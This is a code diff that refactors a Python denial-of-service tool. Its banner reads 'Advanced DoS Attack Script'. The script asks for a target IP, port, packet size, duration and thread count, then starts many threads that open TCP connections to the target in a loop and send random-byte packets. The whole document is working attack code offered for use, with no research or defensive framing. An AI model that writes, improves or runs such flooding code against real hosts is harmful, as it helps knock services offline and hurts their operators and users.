@@ -4,91 +4,82 @@ import threading
 import time
 import os
 
+# Function to clear the console screen
 def clear_screen():
-    """Clears the console screen."""
     os.system("cls" if os.name == "nt" else "clear")
 
+# Function to print the banner
 def print_banner():
-    """Prints a banner for the application."""
     print("-------------------------------------------")
     print("            _____    ____      ____        ")
     print("              |     |    |    |    |   |   ")
     print("(dot)(dot) |     |    |    |    |   |   ")
     print("  O    O      |     |____|    |____|   |___")
     print("-------------------------------------------")
-    print("First installation in the dot dot series")
+    print("Advanced DoS Attack Script")
     print("Made by: EUMonk - Python")
     print("-------------------------------------------")
     print("\n")
 
+# Function to measure ping to the target
 def get_ping(ip, port):
-    """Calculate the ping to the specified IP and port."""
     try:
         start_time = time.time()
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(1)
-        s.connect((ip, port))
-        s.close()
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(1)
+            s.connect((ip, port))
         end_time = time.time()
-        ping = int((end_time - start_time) * 1000)
-        return ping
-    except Exception as e:
-        print(f"Error: Could not connect to {ip}:{port}. Reason: {e}")
+        return int((end_time - start_time) * 1000)
+    except Exception:
         return None  # Return None if the server is unreachable
 
-def start_attack(ip, port, pack):
-    """Execute the DoS attack."""
-    hh = random._urandom(10)
-    xx = 0
-    while True:
+# Function that performs the attack
+def start_attack(ip, port, packet_size, duration):
+    end_time = time.time() + duration
+    packet = random._urandom(packet_size)  # Generate a random packet of specified size
+    packets_sent = 0
+
+    while time.time() < end_time:
         try:
-            ping = get_ping(ip, port)
-            if ping is None:
-                print("Target is unreachable. Waiting before retrying...")
-                time.sleep(10)
-                continue
-
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip, port))
-            s.send(hh)
-            for i in range(pack):
-                s.send(hh)
-            xx += 1
-            print(f"Attacking {ip} | Packets sent: {xx} | Ping: {ping}ms")
-            s.close()
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((ip, port))
+                s.send(packet)  # Send the random packet
+                packets_sent += 1
+            print(f"Sent packet {packets_sent} to {ip}:{port}")
         except Exception as e:
-            print("Error: Connection failed during attack:", e)
-            time.sleep(10)
+            print(f"Error sending packet: {e}")
+            time.sleep(1)  # Wait a bit before retrying
 
+# Function to start multiple attack threads
 def attack_menu():
-    """Gather attack parameters and start DoS attack."""
-    ip = input("[Q] Target IP: ")
-    port = int(input("[Q] Port (must be a number): "))
-    pack = int(input("[Q] Packet/s (must be a number): "))
-    thread_count = int(input("[Q] Thread (must be a number): "))
+    ip = input("Target IP: ")
+    port = int(input("Port (must be a number): "))
+    packet_size = int(input("Packet Size (bytes, e.g. 1024): "))
+    duration = int(input("Attack Duration (seconds): "))
+    thread_count = int(input("Number of Threads: "))
 
-    # Clear screen
-    time.sleep(2)
     clear_screen()
     print_banner()
 
-    # Start DoS attack threads
+    # Start attack threads
+    threads = []
     for _ in range(thread_count):
-        attack_thread = threading.Thread(target=start_attack, args=(ip, port, pack))
-        attack_thread.start()
+        thread = threading.Thread(target=start_attack, args=(ip, port, packet_size, duration))
+        thread.start()
+        threads.append(thread)
 
+    # Wait for all threads to finish
+    for thread in threads:
+        thread.join()
+
+# Main function to run the program
 def main():
     clear_screen()
     print_banner()
-    print("Welcome to the dot dot series")
-    
-    # Proceed directly without password protection
-    print("Access granted.")
-    print("Authenticated successfully!")
 
     while True:
         print("\nSelect an option:")
-        print("1) DoS Attack")
+        print("1) Start DoS Attack")
         print("2) Exit")
         choice = input("Enter your choice: ")
 
